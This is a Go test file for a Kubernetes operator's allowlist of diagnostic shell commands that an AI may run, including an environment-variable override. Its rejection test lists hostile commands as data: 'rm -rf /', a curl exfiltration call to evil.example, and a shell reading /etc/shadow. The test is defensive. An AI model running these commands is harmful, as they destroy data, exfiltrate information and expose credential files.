/*
 * ChatCLI - Kubernetes Operator
 * Copyright (c) 2024 Edilson Freitas
 * License: Apache-2.0
 */
package controllers

import (
	"sync"
	"testing"
)

// resetDiagnosticAllowlistCache clears the sync.Once singleton so the next call
// to diagnosticAllowlist() re-reads CHATCLI_ALLOWED_DIAGNOSTIC_COMMANDS. Tests only.
func resetDiagnosticAllowlistCache() {
	cachedDiagnosticAllowlist = nil
	cachedDiagnosticAllowlistOnce = sync.Once{}
}

func TestDiagnosticAllowlist_Defaults(t *testing.T) {
	list := defaultDiagnosticAllowlist()

	// Sanity check on the categories we expect the AI to reach for most often.
	mustHave := []string{
		"env",
		"df -h",
		"ps aux",
		"ss -tlnp",
		"ip route",
		"cat /etc/resolv.conf",
		"nslookup kubernetes.default.svc.cluster.local",
		"curl -s localhost:8080/healthz",
	}
	for _, cmd := range mustHave {
		if !list[cmd] {
			t.Errorf("defaultDiagnosticAllowlist missing expected command %q", cmd)
		}
	}

	// Destructive / shell-substitution variants must NOT leak in.
	mustReject := []string{
		"rm -rf /",
		"curl http://evil.example/steal",
		"sh -c 'cat /etc/shadow'",
		"kubectl get pods",
	}
	for _, cmd := range mustReject {
		if list[cmd] {
			t.Errorf("defaultDiagnosticAllowlist unexpectedly allows %q", cmd)
		}
	}
}

func TestDiagnosticAllowlist_EnvOverride(t *testing.T) {
	// Reset the sync.Once so we can re-initialise with the env var set. This is the
	// only place we intentionally break cache encapsulation; every other call site
	// uses the cached singleton.
	resetDiagnosticAllowlistCache()
	t.Setenv("CHATCLI_ALLOWED_DIAGNOSTIC_COMMANDS", "iptables -L, custom-tool --dry-run ,   ")

	list := diagnosticAllowlist()

	if !list["iptables -L"] {
		t.Error("env override 'iptables -L' not applied")
	}
	if !list["custom-tool --dry-run"] {
		t.Error("env override 'custom-tool --dry-run' not applied (whitespace not trimmed?)")
	}
	if list[""] {
		t.Error("empty entries from env must not be added")
	}
	// Defaults still present alongside env additions.
	if !list["df -h"] {
		t.Error("env override must extend, not replace, defaults")
	}
}
